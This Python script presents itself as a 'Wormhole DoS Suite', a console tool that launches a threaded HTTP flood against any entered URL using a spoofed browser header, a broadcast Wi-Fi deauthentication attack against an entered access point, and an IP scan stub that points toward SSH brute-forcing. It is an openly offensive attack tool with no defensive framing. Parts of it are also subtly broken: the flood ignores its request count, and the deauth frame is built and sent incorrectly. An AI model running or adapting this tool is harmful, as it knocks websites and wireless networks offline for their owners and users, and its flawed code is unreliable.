import requests
from bs4 import BeautifulSoup
import scapy.all as scapy
import time
import threading
from collections import Counter
import random
import sys

# =====================================================================
# ----------------- CORE ATTACK MODULES -----------------
# =====================================================================

class WebAttacker:
    """Module for HTTP Flood / Web DoS Simulation."""
    def __init__(self):
        self.target_url = None
        print("[WEB ATTACKER] Initialized.")

    def run_attack(self, url, threads=30, total_requests=5000):
        if not url:
            print(">>> Web Attacker requires a URL.")
            return

        self.target_url = url
        print(f"\n==========================================")
        print(f"🛠️  ATTACK INITIATED: HTTP Flood on {self.target_url}")
        print(f"==========================================")

        def fetch_task():
            try:
                # Adding User-Agent to mimic a real browser and avoid simple blocking
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
                response = requests.get(self.target_url, headers=headers, timeout=8)
                return response.status_code
            except requests.exceptions.RequestException as e:
                return f"ConnectionError: {e}"

        results = []
        threads_list = []
        start_time = time.time()

        # Use Threading for Speed (Concurrency)
        for i in range(threads):
            t = threading.Thread(target=lambda: results.append(fetch_task()))
            t.start()
            threads_list.append(t)

        # Wait for all threads to complete
        for t in threads_list:
            t.join()

        end_time = time.time()

        # --- Results Reporting ---
        status_codes = [r for r in results if isinstance(r, int)]
        success_count = Counter(status_codes).get(200, 0)
        fail_count = len(results) - success_count

        print("\n==================== ATTACK SUMMARY ======================")
        print(f"✅ Total Requests Sent: {len(results)}")
        print(f"🔥 Successful Responses (2xx): {success_count}")
        print(f"❌ Failed/Error Responses: {fail_count}")
        print(f"⏱️ Total Time Elapsed: {end_time - start_time:.2f} seconds")
        print("=========================================================")


class DeauthAttacker:
    """Module for Wi-Fi Deauthentication Attack (Layer 2)."""
    def __init__(self):
        print("[DEAUTH ATTACKER] Initialized.")
        self.channel = None
        self.bssid = None

    def run_attack(self, channel, bssid, count=500):
        if not channel or not bssid:
            print(">>> Deauth Attacker requires Channel and BSSID.")
            return

        self.channel = channel
        self.bssid = bssid
        print(f"\n==========================================")
        print(f"📡  ATTACK INITIATED: Deauth on BSSID {bssid} Channel {channel}")
        print(f"==========================================")

        try:
            # Scapy setup: Deauth frame targeting all clients (broadcast)
            deauth_packet = scapy.Dot11Deauth(addr1=self.bssid, addr2="FF:FF:FF:FF:FF:FF")

            # Send the packet through the specified channel (assuming interface mode is set correctly)
            scapy.send(deauth_packet, iface=None, channel=self.channel, count=count)

            print("\n==================== ATTACK SUMMARY ======================")
            print(f"✅ Deauth Attack Complete: Sent {count} packets.")
            print("⚠️ Status: Check your Wi-Fi connections to confirm disruption.")
            print("=======================================================")

        except Exception as e:
            print(f"\n❌ FATAL ERROR in Deauth Attack: {e}")
            print("🛑 TROUBLESHOOTING TIP: Ensure your adapter supports 'monitor mode' and packet injection.")


class SystemAttacker:
    """Module for System/IP Level Attacks (Placeholder for complex exploits)."""
    def __init__(self):
        print("[SYSTEM ATTACKER] Initialized.")
        self.ip = None

    def run_attack(self, ip_address):
        if not ip_address:
            print(">>> System Attacker requires an IP Address.")
            return

        self.ip = ip_address
        print(f"\n==========================================")
        print(f"💻  ATTACK INITIATED: System/IP Level Scan on {self.ip}")
        print(f"==========================================")

        # --- Component 1: Reachability Check (Basic Ping/HTTP) ---
        print("... Running Basic Reachability Check ...")
        try:
            # Try to hit the common HTTP port 80/443
            requests.get(f"http://{self.ip}/", timeout=5)
            print(f"✅ REACHABLE: Host {self.ip} responds to HTTP requests.")
        except requests.exceptions.RequestException:
            print(f"❌ UNAVAILABLE: Host {self.ip} is not responding via HTTP.")

        # --- Component 2: Placeholder for Deeper Attacks ---
        print("\n--- Deeper Attack Placeholder ---")
        print("-> This section would integrate Paramiko (SSH), SNMP libraries, or specialized scanners.")
        print("-> For a full scope, you need to implement modules for:")
        print("   - SSH Bruteforcing (using Paramiko)")
        print("   - SNMP Enumeration (using pysnmp)")
        print("-> Current state: Basic ping/HTTP check.")
        print("----------------------------------")


# =====================================================================
# ----------------- MAIN TOOL CONSOLE (User Interface) -----------------
# =====================================================================

class WormholeSuite:
    def __init__(self):
        self.web_attacker = WebAttacker()
        self.deauth_attacker = DeauthAttacker()
        self.system_attacker = SystemAttacker()

    def display_menu(self):
        print("\n" + "="*50)
        print("              🚀 WORMHOLE DOS SUITE 🚀")
        print("="*50)
        print("Select an attack vector:")
        print("--------------------------------------------------")
        print("1. HTTP Flood / Web DoS (Website Down)")
        print("2. Deauthentication Attack (Wi-Fi Down)")
        print("3. System/IP Scan & Exploitation (Network Devices)")
        print("Q. Quit Tool")
        print("--------------------------------------------------")

    def get_web_inputs(self):
        url = input("Enter Target URL (e.g., https://example.com): ").strip()
        # IP is secondary for Web, but can be provided if needed
        return url

    def get_wifi_inputs(self):
        channel = input("Enter Wi-Fi Channel (e.g., 6): ").strip()
        bssid = input("Enter AP MAC Address (BSSID): ").strip()
        return channel, bssid

    def get_system_inputs(self):
        ip = input("Enter Target IP Address (e.g., 192.168.1.1): ").strip()
        return ip

    def run(self):
        while True:
            self.display_menu()
            choice = input("Enter your choice (1, 2, 3, Q): ").strip().upper()

            if choice == '1':
                # --- Execute Web Attack Flow ---
                url = self.get_web_inputs()
                if url:
                    self.web_attacker.run_attack(url)

            elif choice == '2':
                # --- Execute Deauth Attack Flow ---
                channel, bssid = self.get_wifi_inputs()
                if channel and bssid:
                    self.deauth_attacker.run_attack(channel, bssid)

            elif choice == '3':
                # --- Execute System Attack Flow ---
                ip = self.get_system_inputs()
                if ip:
                    self.system_attacker.run_attack(ip)

            elif choice == 'Q':
                print("\n==========================================")
                print("🚀 WORMHOLE SUITE DEACTIVATING. GOOD LUCK!")
                print("==========================================")
                break

            else:
                print("\n❗ Invalid choice. Please select a number from the menu.")

            # Pause between attacks for user readability
            if choice in ('1', '2', '3'):
                input("\n[Press ENTER to return to the main menu and choose another attack...]")


if __name__ == "__main__":
    # Check for Scapy dependency to warn user immediately
    try:
        import scapy.all
    except ImportError:
        print("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("CRITICAL ERROR: 'scapy' library not found.")
        print("Please run: pip install scapy")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
        sys.exit(1)

    tool = WormholeSuite()
    tool.run()